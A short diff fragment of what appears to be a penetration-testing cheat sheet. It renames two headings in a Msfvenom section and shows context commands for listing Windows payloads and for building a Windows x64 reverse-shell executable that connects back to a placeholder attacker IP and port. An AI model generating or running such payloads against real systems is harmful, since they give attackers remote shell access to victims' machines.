@@ -77,9 +77,9 @@ shell
 channel -i num
 ```
 
-## Msfvenom
+## Msfvenom +++
 
-### Staged Nok
+### Staged Nok <---
 ```
 $ msfvenom -l payloads --platform windows --arch x64
 $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=AttackerIP LPORT=AttackerPort -f exe -o nonstaged.exe
